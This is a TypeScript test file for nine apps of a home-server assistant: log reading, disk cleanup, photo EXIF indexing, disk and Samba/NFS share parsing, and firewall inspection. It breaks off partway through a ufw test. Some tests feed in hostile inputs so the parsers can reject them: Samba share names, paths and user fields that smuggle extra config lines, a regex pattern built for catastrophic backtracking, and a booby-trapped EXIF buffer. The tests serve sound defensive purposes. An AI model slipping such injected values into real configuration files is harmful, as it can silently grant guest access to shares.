// Les 9 applis ajoutées en v1.18 : Chroniques (journaux), Héraclès (nettoyage), Hélios (photos), Pyramide (disques
// et partages), Thermopyles (pare-feu), Dédale (dépôts), Héra (contrôle parental), Olympie (jeux rétro), Plume
// (bureautique). Fonctions pures sur des sorties réelles, et essais sur de vrais fichiers, de vrais dépôts git et
// le vrai Sphinx.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, utimesSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Valhalla } from '../src/valhalla/service.ts';
import { allModules } from '../src/valhalla/odin.ts';
import { DEFAULT_CONFIG } from '../src/config.ts';
import { NAME_STORY } from '../src/valhalla/names.ts';
import { contient, declenche, filtrer, finDeFichier, lireJournald, lireLigne, modele, niveauDe, regrouper, type Ligne } from '../src/valhalla/modules/mimisbrunnr.ts';
import { categories, dedans, grosFichiers, mesurer, mesurerDoux, TMP_SAUF } from '../src/valhalla/modules/gefjon.ts';
import { appareil, chercher, dateExif, doublons, indexer, indexerDoux, lireExif } from '../src/valhalla/modules/sol.ts';
import { ajouterSmb, lireDf, lireExports, lireLsblk, lireSmb, retirerSmb } from '../src/valhalla/modules/fensalir.ts';
import { acces, couvre, dansConteneur, lireRoutes, lireSs, lireUfw, quiEst } from '../src/valhalla/modules/hlid.ts';
import { adresseOk, lireJournal, lireStatut, masquer, nomDe, reglagesRisques, resume } from '../src/valhalla/modules/ivaldi.ts';
import { adresses, AGES, domainePrincipal, rapport } from '../src/valhalla/modules/heidrun.ts';
import { consoleDe, CONSOLES, listeRetroarch, nomPropre, ranger, variantes } from '../src/valhalla/modules/leikvangr.ts';
import { blocs, compter, docx, dossierPermis, html, lignesCsv, lignesXlsx, morceaux, odt, texteDe, texteDocx, texteOdf, xlsx } from '../src/valhalla/modules/snotra.ts';
import { unzip } from '../src/files/zip.ts';

const NEUF = ['mimisbrunnr', 'gefjon', 'sol', 'fensalir', 'hlid', 'ivaldi', 'heidrun', 'leikvangr', 'snotra'];
function world(prefix = 'applis-') {
  const home = mkdtempSync(join(tmpdir(), prefix));
  const v = new Valhalla(home, allModules({ paths: { home, workspace: home }, cfg: DEFAULT_CONFIG } as never), { notify: async () => {}, autonomy: () => 'equilibre' } as never);
  return { v, home, mod: (id: string) => v.modules().find((m) => m.id === id)!, end: () => { v.stop(); rmSync(home, { recursive: true, force: true }); } };
}
const vieux = (f: string, jours: number) => { const t = (Date.now() - jours * 864e5) / 1000; utimesSync(f, t, t); };

test('les 9 applis sont dans Odin : nom, famille, origine du nom, fonctions, page qui s\'affiche', async () => {
  const w = world();
  try {
    for (const id of NEUF) {
      const m = w.mod(id); assert.ok(m, `appli ${id} absente`);
      assert.ok(m.name && m.name !== id && m.what.length > 40 && m.does.length >= 5 && m.from.length >= 1 && m.words.length >= 5, `fiche incomplète : ${id}`);
      assert.ok(NAME_STORY[id]?.length > 30, `origine du nom manquante : ${id}`);
      const view = await m.view(w.v.ctx(id), new URLSearchParams());
      assert.ok(view.sections.length >= 1, `page vide : ${id}`);
      assert.doesNotMatch(JSON.stringify(view), /undefined|NaN|\[object Object\]/, `page avec une valeur cassée : ${id}`);
      for (const a of m.actions) assert.ok(a.label && a.what, `action sans explication : ${id}.${a.id}`);
    }
    // Ce qui efface, ouvre ou partage demande toujours ton accord.
    const grave = (id: string, a: string, i: Record<string, unknown> = {}) => w.mod(id).actions.find((x) => x.id === a)?.grave?.(i);
    assert.match(grave('gefjon', 'nettoyer', { categorie: 'tout' }) ?? '', /effacer/);
    assert.ok(grave('gefjon', 'journal_systeme'));
    for (const a of ['ouvrir_port', 'fermer_port', 'allumer', 'eteindre', 'fermer_box']) assert.ok(grave('hlid', a, { port: 8080 }), `Thermopyles.${a} doit demander l'accord`);
    assert.match(grave('hlid', 'fermer_port', { port: 22 }) ?? '', /perdre l'accès/);
    for (const a of ['ajouter_partage', 'retirer_partage']) assert.ok(grave('fensalir', a, { nom: 'x', chemin: '/srv' }), `Pyramide.${a} doit demander l'accord`);
    // Les réponses qui contiennent du texte écrit par d'autres (journaux, commits, noms de disque) sont reçues comme des données.
    for (const [id, a] of [['mimisbrunnr', 'chercher'], ['mimisbrunnr', 'repetes'], ['ivaldi', 'journal'], ['ivaldi', 'depots'], ['fensalir', 'disques'], ['hlid', 'box'], ['snotra', 'lire'], ['snotra', 'chercher']]) assert.equal(w.mod(id).actions.find((x) => x.id === a)?.external, true, `${id}.${a} doit être marquée « texte venu d'ailleurs »`);
  } finally { w.end(); }
});

// ---------------- Chroniques ----------------
test('Chroniques : gravité, lecture des lignes (journald, syslog, ISO, web), regroupement, filtre', () => {
  assert.equal(niveauDe('tout va bien', 3), 'erreur'); assert.equal(niveauDe('x', 4), 'attention'); assert.equal(niveauDe('x', 6), 'info'); assert.equal(niveauDe('x', 7), 'debug');
  assert.equal(niveauDe('Connection refused by peer'), 'erreur'); assert.equal(niveauDe('retry in 5 s'), 'attention'); assert.equal(niveauDe('session opened'), 'info');
  const j = lireJournald(JSON.stringify({ __REALTIME_TIMESTAMP: '1731500000000000', MESSAGE: 'Failed password for root from 203.0.113.9 port 4242 ssh2', PRIORITY: '5', SYSLOG_IDENTIFIER: 'sshd', _HOSTNAME: 'odin' }))!;
  assert.deepEqual({ t: j.t, niveau: j.niveau, prog: j.prog, hote: j.hote, source: j.source }, { t: 1731500000000, niveau: 'info', prog: 'sshd', hote: 'odin', source: 'système' });
  assert.equal(lireJournald(JSON.stringify({ __REALTIME_TIMESTAMP: '1', MESSAGE: [...Buffer.from('été')], PRIORITY: '3' }))?.texte, 'été');   // message binaire
  assert.equal(lireJournald('pas du json'), undefined); assert.equal(lireJournald('{"PRIORITY":"3"}'), undefined);
  const now = new Date(2026, 10, 13, 17, 0, 0);
  const s1 = lireLigne('Nov 13 15:04:01 odin sshd[812]: Failed password for invalid user admin from 198.51.100.7 port 51122 ssh2', 'log/auth.log', now)!;
  assert.deepEqual({ t: s1.t, prog: s1.prog, hote: s1.hote, niveau: s1.niveau }, { t: new Date(2026, 10, 13, 15, 4, 1).getTime(), prog: 'sshd', hote: 'odin', niveau: 'erreur' });
  assert.equal(new Date(lireLigne('Dec 31 23:59:59 odin cron[1]: fin', 'x', new Date(2026, 0, 2))!.t).getFullYear(), 2025, 'une ligne de décembre lue en janvier est de l\'an passé');
  const iso = lireLigne('2026-11-13T12:00:00+03:00 app WARNING disque presque plein', 'x', now)!; assert.equal(iso.t, Date.parse('2026-11-13T09:00:00Z')); assert.equal(iso.niveau, 'attention');
  const web = lireLigne('203.0.113.5 - - [13/Nov/2026:10:11:12 +0300] "GET /wp-login.php HTTP/1.1" 404 153 "-" "curl"', 'nginx/access.log', now)!;
  assert.equal(web.t, Date.parse('2026-11-13T07:11:12Z')); assert.equal(web.niveau, 'attention');
  assert.equal(lireLigne('ligne sans date', 'x', now)?.t, 0); assert.equal(lireLigne('   ', 'x', now), undefined);
  assert.equal(modele('Failed password for root from 203.0.113.9 port 4242 ssh2'), modele('Failed password for root from 198.51.100.1 port 51000 ssh2'));
  const l: Ligne[] = [1, 2, 3].map((k) => ({ t: 1000 + k, source: 'système', niveau: 'erreur' as const, texte: `Failed password for root from 10.0.0.${k} port ${4000 + k} ssh2`, prog: 'sshd' }));
  l.push({ t: 2000, source: 'Odin', niveau: 'info', texte: 'Sauvegarde finie', prog: 'sindri' });
  const g = regrouper(l); assert.equal(g[0].fois, 3); assert.equal(g[0].modele, 'sshd Failed password for root from <ip> port <n> ssh2'); assert.equal(g[0].exemple, l[2].texte);
  assert.equal(filtrer(l, { q: 'failed ROOT' }).length, 3); assert.equal(filtrer(l, { niveau: 'erreur' }).length, 3); assert.equal(filtrer(l, { source: 'Odin' }).length, 1); assert.equal(filtrer(l, { depuis: 1500 }).length, 1);
});

test('Chroniques : règles en texte simple, fin de fichier seulement, alerte une fois sans se relancer elle-même', async () => {
  assert.ok(contient('Failed password for root', 'failed PASSWORD')); assert.ok(contient('disk full', 'oom|disk full')); assert.ok(!contient('ok', 'a|b'));
  assert.ok(!contient('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!', '(a+)+$'), 'pas d\'expression régulière : un motif piégé est lu comme du texte');
  const l: Ligne[] = Array.from({ length: 6 }, (_, k) => ({ t: 100_000 - k * 30_000, source: 's', niveau: 'erreur' as const, texte: 'Failed password' }));
  assert.equal(declenche({ id: 'r', motif: 'failed password', fois: 3, minutes: 1, niveau: 'moyenne' }, l, 100_000), 3);
  assert.equal(declenche({ id: 'r', motif: 'failed password', fois: 5, minutes: 1, niveau: 'moyenne' }, l, 100_000), 0);
  const w = world('chron-');
  try {
    const f = join(w.home, 'gros.log'); writeFileSync(f, `${'x'.repeat(200)}\n`.repeat(2000) + 'derniere ligne\n');
    const fin = finDeFichier(f, 1000); assert.ok(fin.length < 8 && fin.includes('derniere ligne'), 'seule la fin est lue');
    assert.deepEqual(finDeFichier(join(w.home, 'absent.log')), []);
    // Un journal d'appli à toi, une règle, la veille : une alerte, pas deux, et jamais comptée dans sa propre règle.
    const ctx = w.v.ctx('mimisbrunnr'); ctx.saveSettings({ journald: false });
    const log = join(w.home, 'appli.log'), at = (s: number) => new Date(Date.now() - s * 1000).toISOString();
    writeFileSync(log, [at(50), at(40), at(30)].map((d) => `${d} boutique PAIEMENT-REFUSE-ZZ9 carte`).join('\n') + '\n');
    assert.equal((await w.v.act('mimisbrunnr', 'fichier', { chemin: log })).ok, true);
    assert.equal((await w.v.act('mimisbrunnr', 'fichier', { chemin: 'relatif.log' })).ok, false);
    assert.equal((await w.v.act('mimisbrunnr', 'regle', { motif: 'paiement-refuse-zz9', fois: 1, minutes: 5 })).ok, true);
    const veille = () => w.mod('mimisbrunnr').watch!.run(w.v.ctx('mimisbrunnr'));
    await veille();
    const alertes = () => w.v.ctx('mimisbrunnr').alerts({ limit: 50 }).filter((a) => /PAIEMENT-REFUSE-ZZ9|paiement-refuse-zz9/.test(a.title));
    assert.equal(alertes().length, 1); assert.match(alertes()[0].title, /3 fois en 5 min/);
    // Le fichier se vide : l'alerte de Chroniques (qui cite le motif) ne doit pas déclencher la règle à elle seule.
    writeFileSync(log, '');
    const r = await w.v.act('mimisbrunnr', 'chercher', { q: 'paiement-refuse-zz9', heures: 1 });
    assert.match(r.text, /Odin/, 'l\'alerte d\'Odin est bien visible dans les journaux réunis');
    const regle = (w.v.ctx('mimisbrunnr').settings.regles as Array<{ id: string }>)[0];
    w.v.ctx('mimisbrunnr').saveSettings({ regles: [{ ...regle, id: 'autre-cle' }] });   // autre clé : une nouvelle alerte partirait si la règle se comptait elle-même
    await veille();
    assert.equal(alertes().length, 1, 'la règle ne se relance pas avec sa propre alerte');
    assert.equal((await w.v.act('mimisbrunnr', 'retirer_regle', { id: 'autre-cle' })).ok, true);
  } finally { w.end(); }
});

// ---------------- Héraclès ----------------
test('Héraclès : ne mesure que ce qui est ancien et sans usage, jamais une prise, un dossier caché ou un service', async () => {
  const d = mkdtempSync(join(tmpdir(), 'heracles-')), tmp = join(d, 'tmp'), home = join(d, 'home'); mkdirSync(tmp); mkdirSync(home);
  const srv = createServer();
  try {
    writeFileSync(join(tmp, 'ancien.dat'), 'x'.repeat(5000)); vieux(join(tmp, 'ancien.dat'), 10);
    writeFileSync(join(tmp, 'recent.dat'), 'x'.repeat(5000));
    mkdirSync(join(tmp, 'dossier-vieux')); writeFileSync(join(tmp, 'dossier-vieux', 'a'), 'x'.repeat(3000)); vieux(join(tmp, 'dossier-vieux', 'a'), 30); vieux(join(tmp, 'dossier-vieux'), 30);
    mkdirSync(join(tmp, 'dossier-servi')); writeFileSync(join(tmp, 'dossier-servi', 'neuf'), 'x'.repeat(3000)); vieux(join(tmp, 'dossier-servi'), 30);   // dossier ancien, contenu récent : il sert encore
    mkdirSync(join(tmp, '.X11-unix')); writeFileSync(join(tmp, '.X11-unix', 'X0'), 'x'); vieux(join(tmp, '.X11-unix', 'X0'), 30); vieux(join(tmp, '.X11-unix'), 30);
    mkdirSync(join(tmp, 'systemd-private-abc')); writeFileSync(join(tmp, 'systemd-private-abc', 'f'), 'x'.repeat(100)); vieux(join(tmp, 'systemd-private-abc', 'f'), 30); vieux(join(tmp, 'systemd-private-abc'), 30);
    mkdirSync(join(tmp, 'avec-prise')); writeFileSync(join(tmp, 'avec-prise', 'f'), 'x'.repeat(100)); vieux(join(tmp, 'avec-prise', 'f'), 30);
    if (process.platform !== 'win32') { await new Promise<void>((ok) => srv.listen(join(tmp, 'avec-prise', 'p.sock'), () => ok())); vieux(join(tmp, 'avec-prise'), 30); }
    const cat = categories(home, tmp, 'linux').find((c) => c.id === 'temporaires')!;
    cat.racines = [tmp];
    const noms = mesurer(cat).map((x) => x.chemin.slice(tmp.length + 1)).sort();
    assert.deepEqual(noms, ['ancien.dat', 'dossier-vieux']);
    assert.deepEqual((await mesurerDoux(cat)).map((x) => x.chemin.slice(tmp.length + 1)).sort(), noms, 'la mesure douce donne le même résultat');
    assert.equal(mesurer(cat).find((x) => x.chemin.endsWith('ancien.dat'))!.octets, 5000);
    assert.deepEqual(mesurer(cat, Date.now(), { n: 0 }), [], 'budget épuisé : rien n\'est proposé');
    for (const n of ['.X11-unix', 'systemd-private-x', 'tmux-1000', 'ssh-XXXX', 'snap-private-tmp', 'odin-123']) assert.ok(TMP_SAUF.test(n), n);
    assert.ok(!TMP_SAUF.test('rapport.pdf'));
    assert.ok(dedans(join(tmp, 'ancien.dat'), cat)); assert.ok(!dedans(tmp, cat)); assert.ok(!dedans(join(home, 'photo.jpg'), cat)); assert.ok(!dedans(`${tmp}-autre/x`, cat));
    // Les catégories par système ; les caches gardent les modèles d'IA et les données d'Odin.
    assert.deepEqual(categories('/home/a', '/tmp', 'linux').map((c) => c.id), ['temporaires', 'corbeille', 'caches', 'developpement', 'paquets', 'vieux_journaux']);
    assert.ok(!categories('/Users/a', '/tmp', 'darwin').some((c) => c.id === 'paquets'));
    const caches = categories('/home/a', '/tmp', 'linux').find((c) => c.id === 'caches')!; for (const n of ['huggingface', 'ollama', 'odin', 'ms-playwright']) assert.ok(caches.sauf!.test(n), n);
    // Gros fichiers : montrés seulement, dossiers cachés et node_modules sautés.
    mkdirSync(join(home, 'Videos')); writeFileSync(join(home, 'Videos', 'film.mkv'), 'x'.repeat(9000));
    mkdirSync(join(home, '.cache')); writeFileSync(join(home, '.cache', 'gros'), 'x'.repeat(9000));
    mkdirSync(join(home, 'projet', 'node_modules'), { recursive: true }); writeFileSync(join(home, 'projet', 'node_modules', 'gros'), 'x'.repeat(9000));
    assert.deepEqual(grosFichiers(home, 8000).map((x) => x.chemin), [join(home, 'Videos', 'film.mkv')]);
  } finally { srv.close(); rmSync(d, { recursive: true, force: true }); }
});

test('Héraclès : vider la corbeille libère la place et ne touche pas aux documents', async () => {
  const w = world('heracles-app-');
  try {
    const home = join(w.home, 'maison'), corbeille = join(home, '.local/share/Trash/files'), docs = join(home, 'Documents');
    mkdirSync(corbeille, { recursive: true }); mkdirSync(docs, { recursive: true });
    writeFileSync(join(corbeille, 'jete.bin'), 'x'.repeat(40_000)); mkdirSync(join(corbeille, 'vieux-dossier')); writeFileSync(join(corbeille, 'vieux-dossier', 'a'), 'x'.repeat(10_000));
    writeFileSync(join(docs, 'facture.pdf'), 'important');
    w.v.ctx('gefjon').saveSettings({ dossier: home });
    const page = await w.mod('gefjon').view(w.v.ctx('gefjon'), new URLSearchParams());
    const carte = (page.sections[0] as { items: Array<{ title: string; badge?: string }> }).items.find((x) => x.title === 'Corbeille')!;
    assert.equal(carte.badge, '49 Ko');
    const r = await w.v.act('gefjon', 'nettoyer', { categorie: 'corbeille' });
    assert.equal(r.ok, true); assert.match(r.text, /49 Ko libérés \(2 élément/);
    assert.deepEqual(readdirSync(corbeille), []); assert.equal(readFileSync(join(docs, 'facture.pdf'), 'utf8'), 'important');
    assert.equal((await w.v.act('gefjon', 'nettoyer', { categorie: 'documents' })).ok, false, 'une catégorie inconnue est refusée');
    const apres = await w.mod('gefjon').view(w.v.ctx('gefjon'), new URLSearchParams());
    assert.equal((apres.sections[0] as { items: Array<{ title: string; badge?: string }> }).items.find((x) => x.title === 'Corbeille')!.badge, 'propre', 'la page est remesurée après un nettoyage');
  } finally { w.end(); }
});

// ---------------- Hélios ----------------
/** Un JPEG minimal avec ses informations EXIF (appareil, date, lieu), écrit octet par octet. */
function jpegExif(o: { marque: string; modele: string; date: string; lat: [number, number, number, 'N' | 'S']; lon: [number, number, number, 'E' | 'W'] }, fin = ''): Buffer {
  const t = Buffer.alloc(218), ascii = (at: number, v: string) => t.write(`${v}\0`, at, 'latin1');
  const entry = (at: number, tag: number, type: number, n: number, val: number | string) => { t.writeUInt16BE(tag, at); t.writeUInt16BE(type, at + 2); t.writeUInt32BE(n, at + 4); if (typeof val === 'string') t.write(val, at + 8, 'latin1'); else t.writeUInt32BE(val, at + 8); };
  const rat = (at: number, v: [number, number, number]) => v.forEach((x, k) => { t.writeUInt32BE(x, at + k * 8); t.writeUInt32BE(1, at + k * 8 + 4); });
  t.write('MM', 0, 'latin1'); t.writeUInt16BE(42, 2); t.writeUInt32BE(8, 4);
  t.writeUInt16BE(4, 8); entry(10, 0x010f, 2, o.marque.length + 1, 62); entry(22, 0x0110, 2, o.modele.length + 1, 68); entry(34, 0x8769, 4, 1, 78); entry(46, 0x8825, 4, 1, 116); t.writeUInt32BE(0, 58);
  ascii(62, o.marque); ascii(68, o.modele);
  t.writeUInt16BE(1, 78); entry(80, 0x9003, 2, 20, 96); t.writeUInt32BE(0, 92); ascii(96, o.date);
  t.writeUInt16BE(4, 116); entry(118, 1, 2, 2, `${o.lat[3]}\0`); entry(130, 2, 5, 3, 170); entry(142, 3, 2, 2, `${o.lon[3]}\0`); entry(154, 4, 5, 3, 194); t.writeUInt32BE(0, 166);
  rat(170, [o.lat[0], o.lat[1], o.lat[2]]); rat(194, [o.lon[0], o.lon[1], o.lon[2]]);
  const head = Buffer.alloc(10); head.writeUInt16BE(0xffd8, 0); head.writeUInt16BE(0xffe1, 2); head.writeUInt16BE(2 + 6 + t.length, 4); head.write('Ex', 6, 'latin1');
  return Buffer.concat([head.subarray(0, 6), Buffer.from('Exif\0\0', 'latin1'), t, Buffer.from([0xff, 0xd9]), Buffer.from(fin)]);
}

test('Hélios : date, appareil et lieu lus dans la photo ; index repris sans relire ; doublons ; recherche', async () => {
  assert.equal(o5('Apple', 'iPhone 13'), 'Apple iPhone 13'); assert.equal(o5('Canon', 'Canon EOS R6'), 'Canon EOS R6'); assert.equal(o5(undefined, 'Pixel 8'), 'Pixel 8');
  function o5(a?: string, b?: string) { return appareil(a, b); }
  const j = jpegExif({ marque: 'Apple', modele: 'iPhone 13', date: '2024:07:14 18:22:05', lat: [12, 46, 48, 'S'], lon: [45, 13, 48, 'E'] });
  const x = lireExif(j);
  assert.deepEqual(x, { marque: 'Apple', modele: 'iPhone 13', date: '2024:07:14 18:22:05', lat: -12.78, lon: 45.23 });   // Mamoudzou
  assert.equal(dateExif(x.date), new Date(2024, 6, 14, 18, 22, 5).getTime()); assert.equal(dateExif('0000:00:00 00:00:00'), undefined); assert.equal(dateExif(undefined), undefined);
  // Fichiers abîmés ou piégés : jamais d'erreur.
  assert.deepEqual(lireExif(Buffer.from('pas une image')), {}); assert.deepEqual(lireExif(j.subarray(0, 40)), {});
  const piege = Buffer.from(j); piege.writeUInt32BE(0x7fffffff, 6 + 6 + 4); assert.deepEqual(lireExif(piege), {});
  const d = mkdtempSync(join(tmpdir(), 'helios-'));
  try {
    mkdirSync(join(d, '2024')); mkdirSync(join(d, '.cache'));
    writeFileSync(join(d, '2024', 'IMG_0001.jpg'), j); writeFileSync(join(d, '2024', 'copie de IMG_0001.jpg'), j);
    writeFileSync(join(d, '2024', 'autre.jpg'), jpegExif({ marque: 'Canon', modele: 'Canon EOS R6', date: '2023:01:02 03:04:05', lat: [48, 51, 0, 'N'], lon: [2, 21, 0, 'E'] }));
    writeFileSync(join(d, 'video.mp4'), 'vidéo'); writeFileSync(join(d, 'note.txt'), 'pas une photo'); writeFileSync(join(d, '.cache', 'cachee.jpg'), j);
    const l = indexer([d]);
    assert.equal(l.length, 4); assert.equal(l.filter((p) => p.video).length, 1);
    const p = l.find((y) => y.chemin.endsWith('IMG_0001.jpg') && !y.chemin.includes('copie'))!;
    assert.deepEqual({ date: p.date, appareil: p.appareil, lat: p.lat, lon: p.lon }, { date: new Date(2024, 6, 14, 18, 22, 5).getTime(), appareil: 'Apple iPhone 13', lat: -12.78, lon: 45.23 });
    // Deuxième passage : les fichiers inchangés ne sont pas relus (on garde l'objet déjà lu).
    const marque = { ...p, appareil: 'déjà lu' }, l2 = await indexerDoux([d], l.map((y) => (y === p ? marque : y)));
    assert.equal(l2.find((y) => y.chemin === p.chemin)!.appareil, 'déjà lu'); assert.equal(l2.length, 4);
    assert.deepEqual(indexer([d, d]).length, 4, 'un dossier donné deux fois ne double pas les photos');
    const g = doublons(l); assert.equal(g.length, 1); assert.equal(g[0].length, 2); assert.ok(g[0].every((y) => /IMG_0001/.test(y.chemin)));
    assert.equal(chercher(l, { annee: 2024 }).length, 2); assert.equal(chercher(l, { annee: 2023, mois: 1 }).length, 1); assert.equal(chercher(l, { appareil: 'canon' }).length, 1); assert.equal(chercher(l, { lieu: true }).length, 3); assert.equal(chercher(l, { texte: 'COPIE' }).length, 1);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('Hélios : ranger, frise avec vignettes, album, dossier trop large refusé', async () => {
  const w = world('helios-app-');
  try {
    const d = join(w.home, 'Photos'); mkdirSync(d);
    writeFileSync(join(d, 'plage.jpg'), jpegExif({ marque: 'Apple', modele: 'iPhone 13', date: '2024:07:14 18:22:05', lat: [12, 46, 48, 'S'], lon: [45, 13, 48, 'E'] }));
    assert.equal((await w.v.act('sol', 'dossier', { chemin: '/' })).ok, false); assert.equal((await w.v.act('sol', 'dossier', { chemin: join(w.home, 'absent') })).ok, false);
    assert.equal((await w.v.act('sol', 'dossier', { chemin: d })).ok, true);
    assert.match((await w.v.act('sol', 'indexer')).text, /1 photo\(s\) et 0 vidéo/);
    const page = await w.mod('sol').view(w.v.ctx('sol'), new URLSearchParams());
    assert.ok(page.sections.some((s) => s.kind === 'cards' && /juillet 2024/i.test(s.title ?? '')), 'la frise montre juillet 2024');
    assert.match((await w.v.act('sol', 'chercher', { annee: 2024, lieu: true })).text, /plage\.jpg/);
    assert.equal((await w.v.act('sol', 'album', { nom: 'Été', annee: 2024 })).ok, true); assert.equal((await w.v.act('sol', 'album', { nom: 'Vide', annee: 1999 })).ok, false);
    assert.deepEqual(Object.keys(w.v.ctx('sol').settings.albums as object), ['Été']);
  } finally { w.end(); }
});

// ---------------- Pyramide ----------------
test('Pyramide : disques (lsblk), volumes (df) sans les faux pleins d\'un conteneur ou de snap, partages Samba et NFS', () => {
  const lsblk = JSON.stringify({ blockdevices: [
    { name: 'nvme0n1', size: 512110190592, type: 'disk', model: 'Samsung SSD 980 ', serial: 'S64ANX0R', rota: false, tran: 'nvme', rm: false, children: [{ name: 'nvme0n1p1', size: 536870912, type: 'part', fstype: 'vfat', mountpoints: ['/boot/efi'] }, { name: 'nvme0n1p2', size: 511572246528, type: 'part', fstype: 'ext4', mountpoint: '/', label: 'racine' }] },
    { name: 'sda', size: '4000787030016', type: 'disk', model: 'WDC WD40EFAX', rota: '1', tran: 'sata', rm: '0', children: [{ name: 'sda1', size: 4000785964544, type: 'part', fstype: 'crypto_LUKS', children: [{ name: 'coffre', size: 4000769187328, type: 'crypt', fstype: 'ext4', mountpoint: '/srv/data' }] }] },
    { name: 'sdb', size: 31914983424, type: 'disk', model: 'Cruzer', rota: true, tran: 'usb', rm: true },
    { name: 'loop0', size: 66846720, type: 'loop' }, { name: 'zram0', size: 8e9, type: 'disk' },
  ] });
  const d = lireLsblk(lsblk);
  assert.deepEqual(d.map((x) => [x.nom, x.ssd, x.amovible, x.transport]), [['nvme0n1', true, false, 'nvme'], ['sda', false, false, 'sata'], ['sdb', false, true, 'usb']]);
  assert.equal(d[0].modele, 'Samsung SSD 980'); assert.deepEqual(d[0].parts.map((p) => [p.nom, p.fs, p.monte]), [['nvme0n1p1', 'vfat', '/boot/efi'], ['nvme0n1p2', 'ext4', '/']]);
  assert.deepEqual(d[1].parts.map((p) => p.nom), ['sda1', 'coffre'], 'le volume chiffré est listé sous sa partition'); assert.equal(d[1].parts[1].monte, '/srv/data');
  assert.deepEqual(lireLsblk('pas du json'), []);
  // Une machine normale : / et /home sur le même disque ne comptent qu'une fois ; snap et CD (toujours pleins) ignorés.
  const df = `Filesystem     Type     1024-blocks      Used Available Capacity Mounted on
/dev/nvme0n1p2 btrfs   500000000000 300000000000 200000000000      60% /
/dev/nvme0n1p2 btrfs   500000000000 300000000000 200000000000      60% /home
tmpfs          tmpfs     8000000000         0   8000000000       0% /dev/shm
/dev/loop3     squashfs    66846720  66846720            0     100% /snap/core22/1612
/dev/sr0       iso9660   4700000000 4700000000           0     100% /media/moi/Ubuntu 24.04
/dev/sda1      ext4    4000000000000 3900000000000 100000000000      98% /srv/data
//nas/films    cifs    8000000000000 1000000000000 7000000000000      13% /mnt/nas films`;
  const v = lireDf(df);
  assert.deepEqual(v.map((x) => x.monte), ['/', '/srv/data', '/mnt/nas films']); assert.equal(v[1].utilise / v[1].taille > 0.9, true);
  // Odin dans un conteneur Docker : seul « / » compte, pas /etc/hosts (qui montre le disque de l'hôte, parfois plein).
  const docker = `Filesystem     Type    1024-blocks       Used  Available Capacity Mounted on
overlay        overlay 250000000000 240000000000 10000000000      96% /
tmpfs          tmpfs      67108864          0    67108864       0% /dev
shm            tmpfs      67108864          0    67108864       0% /dev/shm
/dev/sda1      ext4    250000000000 240000000000 10000000000      96% /etc/hosts
/dev/sda1      ext4    250000000000 240000000000 10000000000      96% /etc/resolv.conf
/dev/sdb1      ext4    1000000000000 100000000000 900000000000      10% /root/.odin
overlay        overlay 250000000000 240000000000 10000000000      96% /var/lib/docker/overlay2/abc/merged`;
  assert.deepEqual(lireDf(docker).map((x) => x.monte), ['/', '/root/.odin']);
  const conf = `[global]\n   workgroup = MAISON\n; commentaire\n[printers]\n   path = /var/tmp\n[Films]\n   path = /srv/films\n   read only = yes\n   guest ok = yes\n[Compta]\n   path = /srv/compta\n   writable = yes\n   valid users = fatima, @compta\n`;
  assert.deepEqual(lireSmb(conf), [{ nom: 'Films', chemin: '/srv/films', lecture: true, invites: true, type: 'samba' }, { nom: 'Compta', chemin: '/srv/compta', lecture: false, invites: false, type: 'samba', utilisateurs: 'fatima, @compta' }]);
  const plus = ajouterSmb(conf, { nom: 'Photos 2026', chemin: '/srv/photos', lecture: false, utilisateurs: 'fatima' });
  assert.deepEqual(lireSmb(plus).at(-1), { nom: 'Photos 2026', chemin: '/srv/photos', lecture: false, invites: false, type: 'samba', utilisateurs: 'fatima' });
  assert.ok(plus.startsWith(conf.trimEnd()), 'le fichier d\'origine est gardé tel quel');
  assert.equal(retirerSmb(plus, 'photos 2026').trim(), conf.trim(), 'retirer remet le fichier comme avant');
  assert.throws(() => ajouterSmb(conf, { nom: 'films', chemin: '/x', lecture: true }), /existe déjà/);
  assert.throws(() => ajouterSmb(conf, { nom: 'global', chemin: '/x', lecture: true }), /invalide/);
  assert.throws(() => ajouterSmb(conf, { nom: 'x]\n[global', chemin: '/x', lecture: true }), /invalide/);
  assert.throws(() => ajouterSmb(conf, { nom: 'ok', chemin: '/x\n   guest ok = yes', lecture: true }), /chemin/);
  assert.throws(() => ajouterSmb(conf, { nom: 'ok', chemin: 'relatif', lecture: true }), /chemin/);
  assert.throws(() => ajouterSmb(conf, { nom: 'ok', chemin: '/x', lecture: true, utilisateurs: 'a\nguest ok = yes' }), /utilisateurs/);
  assert.throws(() => retirerSmb(conf, 'absent'), /introuvable/);
  assert.deepEqual(lireExports('# partages\n/srv/nfs/films 192.168.1.0/24(ro,sync)\n/srv/nfs/travail 192.168.1.20(rw,sync) 192.168.1.21(rw)\n').map((p) => [p.nom, p.lecture, p.type]), [['films', true, 'nfs'], ['travail', false, 'nfs']]);
});

// ---------------- Thermopyles ----------------
test('Thermopyles : ports à l\'écoute, règles ufw, qui peut joindre quoi, routes', () => {
  const ss = `udp   UNCONN 0      0            0.0.0.0:5353       0.0.0.0:*    users:(("avahi-daemon",pid=700,fd=12))
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*    users:(("systemd-resolve",pid=600,fd=13))
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=900,fd=3))
tcp   LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=900,fd=4))
tcp   LISTEN 0      511        127.0.0.1:6379       0.0.0.0:*    users:(("redis-server",pid=950,fd=6))
tcp   LISTEN 0      4096               *:7777             *:*    users:(("node",pid=1200,fd=22))
tcp   LISTEN 0      50           0.0.0.0:445        0.0.0.0:*    users:(("smbd",pid=1000,fd=30))`;
  const l = lireSs(ss);
  assert.deepEqual(l.map((x) => `${x.port}/${x.proto}/${x.portee}`), ['22/tcp/réseau', '53/udp/machine', '445/tcp/réseau', '5353/udp/réseau', '6379/tcp/machine', '7777/tcp/réseau']);
  assert.equal(l.find((x) => x.port === 22)!.prog, 'sshd'); assert.equal(l.filter((x) => x.port === 22).length, 1, 'IPv4 et IPv6 du même port : une seule ligne');
  const ufw = lireUfw(`Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), disabled (routed)
New profiles: skip

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW IN    Anywhere
